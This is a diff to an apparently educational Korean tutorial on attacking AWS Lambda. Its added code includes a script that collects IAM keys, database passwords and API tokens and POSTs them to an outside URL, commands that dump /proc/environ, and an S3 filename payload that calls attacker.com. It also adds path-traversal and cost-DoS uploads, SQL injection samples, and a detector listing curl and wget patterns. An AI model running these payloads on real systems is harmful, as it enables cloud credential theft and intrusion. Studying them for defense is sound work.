@@ -6,48 +6,230 @@
 
 # AWS Lambda 함수 공격 기법
 
+## 0. 초보자를 위한 개념 이해
+
+### AWS Lambda란?
+
+**AWS Lambda**는 서버 없이 코드를 실행할 수 있는 서비스입니다. 코드를 작성해서 올려두면, 특정 이벤트가 발생할 때마다 자동으로 실행됩니다.
+
+```
+Lambda 실행 흐름:
+이벤트 발생          Lambda 실행          결과 반환
+(API 요청,     →    (코드 실행 + IAM    →  (응답 반환 +
+ 파일 업로드,         역할로 AWS 서비스     CloudWatch 로그)
+ 메시지 수신)         접근 가능)
+
+실행 환경 특성:
+- 함수마다 독립된 컨테이너에서 실행
+- 실행 후 환경 종료 (메모리/파일 소멸)
+- /tmp 디렉터리 (최대 10GB)만 임시 저장 가능
+- 각 실행은 IAM 역할의 권한을 가짐
+```
+
+### 공격자가 Lambda를 노리는 이유
+
+**1. IAM 역할 = 모든 AWS 자원에 대한 마스터 키 가능성**
+```
+Lambda 함수가 s3:* 권한을 가지면:
+  → 공격자가 Lambda에 RCE 달성 시
+  → 그 함수의 IAM 역할로 모든 S3 버킷 접근
+  → 수백 GB의 데이터 탈취 가능
+```
+
+**2. 환경 변수에 자격증명 저장하는 개발자 관행**
+```
+많은 개발자가 편의상 환경 변수에 저장:
+  DB_PASSWORD=mypassword123
+  API_KEY=sk-abcdef...
+  AWS_SECRET=...
+
+→ RCE 달성 시 os.environ으로 즉시 획득
+```
+
+**3. 이벤트 소스의 다양성 = 넓은 공격 표면**
+```
+API Gateway (HTTP), SQS (메시지), S3 (파일),
+DynamoDB Streams, EventBridge, SNS, Cognito...
+
+→ 여러 경로로 악성 입력 주입 가능
+```
+
+### 서버리스 공격의 일반적인 킬 체인
+
+```
+1. 정찰 단계
+   - Lambda 함수 이름, 런타임, 트리거 파악
+   - 공개된 API 엔드포인트 식별
+
+2. 초기 접근
+   - 이벤트 인젝션 (커맨드/SQL/경로 인젝션)
+   - 취약한 의존성 익스플로잇
+
+3. 실행 (RCE)
+   - Lambda 런타임 내 임의 코드 실행
+
+4. 자격증명 수집
+   - 환경 변수 덤프 (API 키, 비밀번호)
+   - SSRF → IMDS → IAM 자격증명 탈취
+
+5. 피벗 및 영향
+   - 탈취한 IAM 자격증명으로 다른 AWS 서비스 접근
+   - S3 버킷 탈취, RDS 접근, 다른 Lambda 함수 수정
+```
+
+---
+
 ## 1. 서버리스 위협 모델
 
 서버리스 환경은 인프라 관리 부담을 줄이지만, 실행 컨텍스트·환경 변수·IAM 역할·이벤트 소스에 새로운 공격 표면이 생긴다.
 
-| 공격 벡터 | 설명 |
-|-----------|------|
-| 환경 변수 탈취 | API 키·DB 자격증명·시크릿 노출 |
-| IAM 역할 과다 권한 | Lambda 역할로 다른 AWS 서비스 접근 |
-| SSRF → 메타데이터 서비스 | IMDSv1 통해 IAM 임시 자격증명 획득 |
-| 의존성 인젝션 | npm/pip 패키지 타이포스쿼팅 |
-| 이벤트 인젝션 | 이벤트 소스(SQS·S3·API Gateway)를 통한 인젝션 |
-| 타임아웃 공격 | 긴 실행으로 비용·가용성 공격 |
-| 콜드 스타트 레이스 | 초기화 로직 타이밍 공격 |
+| 공격 벡터 | 설명 | 심각도 |
+|-----------|------|--------|
+| 환경 변수 탈취 | API 키·DB 자격증명·시크릿 노출 | 높음 |
+| IAM 역할 과다 권한 | Lambda 역할로 다른 AWS 서비스 접근 | 높음 |
+| SSRF → 메타데이터 서비스 | IMDSv1 통해 IAM 임시 자격증명 획득 | 높음 |
+| 의존성 인젝션 | npm/pip 패키지 타이포스쿼팅 | 중간 |
+| 이벤트 인젝션 | 이벤트 소스(SQS·S3·API Gateway)를 통한 인젝션 | 높음 |
+| 타임아웃 공격 | 긴 실행으로 비용·가용성 공격 | 중간 |
+| 콜드 스타트 레이스 | 초기화 로직 타이밍 공격 | 낮음 |
 
 ---
 
 ## 2. 환경 변수 탈취
 
-Lambda 함수 코드가 RCE 취약점을 가지면 환경 변수를 직접 읽을 수 있다.
+Lambda 함수 코드가 RCE(원격 코드 실행) 취약점을 가지면 환경 변수를 직접 읽을 수 있다.
+
+### 환경 변수에 저장될 수 있는 민감 정보
+
+```
+AWS Lambda 환경 변수 예시:
+
+자동으로 있는 것 (Lambda가 자동 주입):
+  AWS_REGION=ap-northeast-2
+  AWS_LAMBDA_FUNCTION_NAME=my-function
+  AWS_ACCESS_KEY_ID=ASIA...     ← IAM 임시 자격증명!
+  AWS_SECRET_ACCESS_KEY=...
+  AWS_SESSION_TOKEN=...
+
+개발자가 직접 넣는 것 (하드코딩 위험):
+  DB_HOST=prod-db.internal
+  DB_PASSWORD=supersecret123    ← 데이터베이스 비밀번호
+  STRIPE_API_KEY=sk_live_...    ← 결제 API 키
+  GITHUB_TOKEN=ghp_...          ← 소스코드 접근 토큰
+```
 
 ```python
-# Lambda 내부에서 환경 변수 덤프 (RCE 성공 후)
-import os, json, urllib.request
+#!/usr/bin/env python3
+"""환경 변수 탈취 시뮬레이터 (교육/CTF 목적).
 
-def exfiltrate_env(exfil_url: str) -> None:
-    env_vars = dict(os.environ)
-    # 자격증명 관련 키 우선 추출
-    sensitive = {k: v for k, v in env_vars.items()
-                 if any(kw in k.upper() for kw in
-                        ["KEY", "SECRET", "TOKEN", "PASS", "DB", "CREDENTIAL"])}
-    data = json.dumps(sensitive).encode()
-    req = urllib.request.Request(exfil_url, data=data, method="POST")
-    urllib.request.urlopen(req, timeout=5)
+RCE 취약점이 Lambda에서 악용될 때 일어날 수 있는 일을 보여줍니다.
+"""
+
+import os
+import json
+import urllib.request
+from dataclasses import dataclass
+
+
+@dataclass
+class SensitiveEnvVar:
+    """민감한 환경 변수 항목."""
+    key: str
+    value: str
+    category: str  # IAM, DB, API, OTHER
+
+
+def classify_env_var(key: str, value: str) -> str:
+    """환경 변수를 카테고리로 분류."""
+    key_upper = key.upper()
+    
+    if any(kw in key_upper for kw in ["AWS_ACCESS_KEY", "AWS_SECRET", "AWS_SESSION_TOKEN"]):
+        return "IAM_CREDENTIALS"  # 가장 위험
+    elif any(kw in key_upper for kw in ["DB_", "DATABASE_", "MYSQL_", "POSTGRES_", "MONGO_"]):
+        return "DATABASE"
+    elif any(kw in key_upper for kw in ["API_KEY", "STRIPE_", "TWILIO_", "SENDGRID_"]):
+        return "API_KEY"
+    elif any(kw in key_upper for kw in ["SECRET", "PASSWORD", "PASSWD", "TOKEN", "CREDENTIAL"]):
+        return "SECRET"
+    return "OTHER"
+
+
+def dump_sensitive_env() -> list[SensitiveEnvVar]:
+    """현재 환경에서 민감한 변수 추출."""
+    sensitive = []
+    
+    for key, value in os.environ.items():
+        category = classify_env_var(key, value)
+        if category != "OTHER":
+            sensitive.append(SensitiveEnvVar(key=key, value=value, category=category))
+    
+    # 가장 위험한 카테고리 먼저
+    priority = {"IAM_CREDENTIALS": 0, "SECRET": 1, "DATABASE": 2, "API_KEY": 3}
+    return sorted(sensitive, key=lambda x: priority.get(x.category, 99))
+
+
+def exfiltrate_env(exfil_url: str, dry_run: bool = True) -> None:
+    """환경 변수를 외부 서버로 전송 (시뮬레이터).
+    
+    dry_run=True: 실제 전송 없이 출력만 (안전한 교육용 모드)
+    dry_run=False: 실제 외부 전송 (실제 공격/테스트 환경에서만)
+    """
+    sensitive = dump_sensitive_env()
+    
+    if not sensitive:
+        print("[-] 민감한 환경 변수 없음")
+        return
+    
+    print(f"[+] 민감한 환경 변수 {len(sensitive)}개 발견:")
+    for var in sensitive:
+        # 값의 앞 20자만 표시 (전체 노출 방지)
+        preview = var.value[:20] + "..." if len(var.value) > 20 else var.value
+        print(f"  [{var.category}] {var.key} = {preview}")
+    
+    if not dry_run:
+        data = json.dumps([
+            {"key": v.key, "value": v.value, "category": v.category}
+            for v in sensitive
+        ]).encode()
+        
+        req = urllib.request.Request(
+            exfil_url,
+            data=data,
+            method="POST",
+            headers={"Content-Type": "application/json"}
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                print(f"[+] 전송 완료: {resp.status}")
+        except Exception as e:
+            print(f"[-] 전송 실패: {e}")
 ```
 
 ### 2.1 /proc/environ 접근
 
+Linux에서 `/proc/` 가상 파일시스템은 프로세스 정보에 접근할 수 있는 특수 디렉터리입니다. Lambda도 Linux에서 실행되므로 RCE 달성 시 `/proc/1/environ`으로 환경 변수를 읽을 수 있습니다.
+
 ```bash
 # Lambda 런타임에서 /proc/1/environ 읽기 (RCE 전제)
+# /proc/1 = PID 1 (Lambda 런타임 프로세스)
+# environ 파일은 null 바이트(\0)로 구분된 환경 변수 목록
 cat /proc/1/environ | tr '\0' '\n'
+
+# AWS 관련 환경 변수만 필터링
 cat /proc/self/environ | tr '\0' '\n' | grep -E "AWS|SECRET|KEY|TOKEN"
+
+# Lambda 전용 환경 변수 확인
+cat /proc/self/environ | tr '\0' '\n' | grep -E "LAMBDA|HANDLER|RUNTIME"
 ```
+
+**실제 Lambda 환경에서 발견되는 IAM 관련 환경 변수:**
+```
+AWS_ACCESS_KEY_ID=ASIA3XXXXXXXXXXXXX   ← 임시 자격증명
+AWS_SECRET_ACCESS_KEY=abc123...        ← 비밀 키
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2...   ← 세션 토큰 (긴 문자열)
+```
+
+이 세 가지를 가져가면 Lambda 함수의 IAM 역할과 동일한 권한으로 AWS API를 호출할 수 있습니다 (만료 전까지 약 1시간).
 
 ---
 
@@ -147,49 +329,155 @@ if __name__ == "__main__":
 
 ## 4. Lambda 이벤트 인젝션
 
+### 이벤트 인젝션이란?
+
+Lambda 함수는 여러 이벤트 소스에서 데이터를 받습니다. 공격자는 이 데이터를 통해 악의적인 페이로드를 주입합니다.
+
+```
+공격자 → API Gateway 요청 → Lambda 함수 → DB/OS/파일 시스템
+          (조작된 파라미터)     (검증 없이 사용)  (취약점 실행)
+```
+
 ### 4.1 API Gateway 이벤트 조작
 
+**API Gateway Lambda 이벤트 구조:** Lambda가 받는 이벤트는 JSON 딕셔너리입니다. HTTP 요청의 모든 정보(메서드, 헤더, 바디, 쿼리 파라미터)가 포함됩니다.
+
 ```python
-# API Gateway → Lambda 이벤트 구조 예시
-event = {
+#!/usr/bin/env python3
+"""API Gateway 이벤트 인젝션 취약점 및 방어 패턴 (교육용)."""
+
+import json
+import sqlite3
+import re
+from pathlib import Path
+
+
+# API Gateway → Lambda 이벤트 구조
+# 공격자가 이 구조를 이해하면 각 필드에 페이로드를 삽입할 수 있음
+SAMPLE_MALICIOUS_EVENT = {
     "httpMethod": "POST",
     "path": "/api/query",
-    "headers": {"Authorization": "Bearer TOKEN"},
-    "body": '{"query": "1; DROP TABLE users--"}',  # SQL 인젝션
+    "headers": {
+        "Authorization": "Bearer TOKEN",
+        "X-Forwarded-For": "'; DROP TABLE users; --"  # 헤더를 통한 인젝션
+    },
+    "body": '{"query": "1; DROP TABLE users--"}',         # 바디를 통한 SQL 인젝션
     "queryStringParameters": {
-        "page": "1 UNION SELECT username,password FROM admin--"
+        "page": "1 UNION SELECT username,password FROM admin--"  # 쿼리 파라미터 인젝션
     }
 }
 
-# 취약한 Lambda 핸들러 (인젝션 취약)
-def handler_vulnerable(event, context):
-    import sqlite3
+
+# ❌ 취약한 Lambda 핸들러: 사용자 입력을 SQL에 직접 삽입
+def handler_vulnerable(event: dict, context) -> dict:
     page = event["queryStringParameters"]["page"]
     conn = sqlite3.connect("/tmp/db.sqlite3")
-    # 위험: 직접 포맷 — SQLi 취약
-    results = conn.execute(f"SELECT * FROM items WHERE id = {page}").fetchall()
-    return {"statusCode": 200, "body": str(results)}
+    
+    # 위험: f-string으로 SQL 직접 구성 → SQL 인젝션 취약
+    # page = "1 UNION SELECT username,password FROM admin--" 이면
+    # 모든 관리자 계정 정보가 반환됨!
+    query = f"SELECT * FROM items WHERE id = {page}"
+    results = conn.execute(query).fetchall()
+    return {"statusCode": 200, "body": json.dumps(results)}
 
-# 안전한 핸들러
-def handler_safe(event, context):
-    import sqlite3
-    page = event["queryStringParameters"].get("page", "1")
-    if not page.isdigit():
-        return {"statusCode": 400, "body": "Invalid page parameter"}
+
+# ✅ 안전한 Lambda 핸들러: 파라미터화 쿼리 + 타입 검증
+def handler_safe(event: dict, context) -> dict:
+    page_str = event["queryStringParameters"].get("page", "1")
+    
+    # 1단계: 타입 검증 (숫자만 허용)
+    if not page_str.isdigit():
+        return {
+            "statusCode": 400,
+            "body": json.dumps({"error": "page must be a positive integer"})
+        }
+    
+    page = int(page_str)
+    
+    # 2단계: 범위 검증 (너무 큰 페이지 번호 차단)
+    if not 1 <= page <= 10000:
+        return {
+            "statusCode": 400,
+            "body": json.dumps({"error": "page must be between 1 and 10000"})
+        }
+    
     conn = sqlite3.connect("/tmp/db.sqlite3")
-    results = conn.execute("SELECT * FROM items WHERE id = ?", (int(page),)).fetchall()
-    return {"statusCode": 200, "body": str(results)}
+    
+    # 3단계: 파라미터화 쿼리 (SQL 인젝션 방지)
+    # ? 자리에 page 값이 자동으로 이스케이프되어 삽입됨
+    results = conn.execute(
+        "SELECT id, title, content FROM items WHERE id = ?",
+        (page,)
+    ).fetchall()
+    
+    return {
+        "statusCode": 200,
+        "body": json.dumps([{"id": r[0], "title": r[1]} for r in results])
+    }
+
+
+# Lambda 이벤트 인젝션 탐지기
+class EventInjectionDetector:
+    """Lambda 이벤트에서 인젝션 패턴을 탐지."""
+    
+    INJECTION_PATTERNS = {
+        "sql_injection": [
+            r"union\s+select",
+            r"drop\s+table",
+            r"insert\s+into",
+            r";\s*(select|update|delete|insert|drop)",
+            r"--\s*$",          # SQL 주석
+            r"'\s*or\s+'",      # OR 기반 바이패스
+        ],
+        "command_injection": [
+            r";\s*(ls|cat|id|whoami|rm|curl|wget)",
+            r"\$\(.*\)",
+            r"`.*`",
+            r"\|\s*(bash|sh|cmd)",
+        ],
+        "path_traversal": [
+            r"\.\./",
+            r"\.\.\\",
+            r"%2e%2e%2f",
+        ],
+    }
+    
+    def scan_event(self, event: dict) -> list[dict]:
+        """이벤트 전체를 스캔해서 인젝션 패턴 탐지."""
+        findings = []
+        event_str = json.dumps(event).lower()
+        
+        for attack_type, patterns in self.INJECTION_PATTERNS.items():
+            for pattern in patterns:
+                if re.search(pattern, event_str, re.IGNORECASE):
+                    findings.append({
+                        "type": attack_type,
+                        "pattern": pattern,
+                        "severity": "HIGH" if attack_type in ("sql_injection", "command_injection") else "MEDIUM"
+                    })
+                    break
+        
+        return findings
 ```
 
 ### 4.2 S3 이벤트 트리거 조작
 
+S3에 파일을 업로드하면 Lambda가 자동으로 실행됩니다. 파일명이나 파일 내용을 조작해 인젝션 공격을 시도할 수 있습니다.
+
 ```bash
-# S3 이벤트를 통한 Lambda 트리거 조작
-# 파일명에 특수문자 삽입 → Lambda에서 처리 시 커맨드 인젝션
+# 공격 1: 파일명에 쉘 명령어 삽입
+# Lambda가 파일명을 shell=True로 처리하면 명령 실행됨
 aws s3 cp payload.zip "s3://target-bucket/$(curl attacker.com/$(whoami)).zip"
 
-# 대용량 파일로 Lambda 타임아웃 유발 (비용 DoS)
+# 공격 2: 경로 순회를 이용한 파일명 
+# Lambda가 키를 파일 경로로 사용하면 위험
+aws s3 cp malicious.txt "s3://target-bucket/../../etc/passwd"
+
+# 공격 3: 대용량 파일로 Lambda 타임아웃 유발 (DoS + 비용 공격)
+# Lambda 최대 타임아웃 15분 × 요금 = 비용 폭탄
 dd if=/dev/zero bs=1M count=500 | aws s3 cp - s3://target-bucket/large-file.bin
+
+# 방어: 버킷 정책으로 최대 오브젝트 크기 제한 + 파일명 검증
 ```
 
 ---
